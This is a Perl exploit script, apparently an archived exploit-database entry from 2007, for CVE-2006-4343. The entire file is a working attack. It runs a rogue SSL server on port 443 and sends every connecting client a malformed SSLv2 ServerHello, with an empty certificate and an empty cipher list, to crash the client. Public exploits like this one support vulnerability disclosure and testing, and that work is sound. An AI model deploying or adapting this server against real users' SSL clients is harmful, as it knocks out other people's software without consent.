#!/usr/bin/perl
# Copyright(c) Beyond Security
# Written by Noam Rathaus - based on beSTORM's SSL Server module
# Exploits vulnerability CVE-2006-4343 - where the SSL client can be crashed by special SSL serverhello response

use strict;
use IO::Socket;
my $sock = new IO::Socket::INET ( LocalPort => '443', Proto => 'tcp', Listen => 1, Reuse => 1, );
die "Could not create socket: $!\n" unless $sock;

my $TIMEOUT = 0.5;
my $line;
my $new_sock;
srand(time());

while ( $new_sock = $sock->accept() )
{
 printf ("new connection\n");
 my $rin;
 my $line;
 my ($nfound, $timeleft) = select($rin, undef, undef, $TIMEOUT) && recv($new_sock, $line, 1024, undef);

 my $ciphers = "";
 my $ciphers_length = pack('n', length($ciphers));

 my $certificate = "";
 my $certificate_length = pack('n', length($certificate));

 my $packet_sslv2 =
"\x04".
"\x01". # Hit (default 0x01)

"\x00". # No certificate

"\x00\x02".
$certificate_length.
$ciphers_length.
"\x00\x10".
# Certificate
$certificate.
# Done
# Ciphers
$ciphers.
# Done
"\xf5\x61\x1b\xc4\x0b\x34\x1b\x11\x3c\x52\xe9\x93\xd1\xfa\x29\xe9";

 my $ssl_length = pack('n', length($packet_sslv2) + 0x8000);
 $packet_sslv2 = $ssl_length . $packet_sslv2;

 print $new_sock $packet_sslv2;

 close($new_sock);
}

# milw0rm.com [2007-12-23]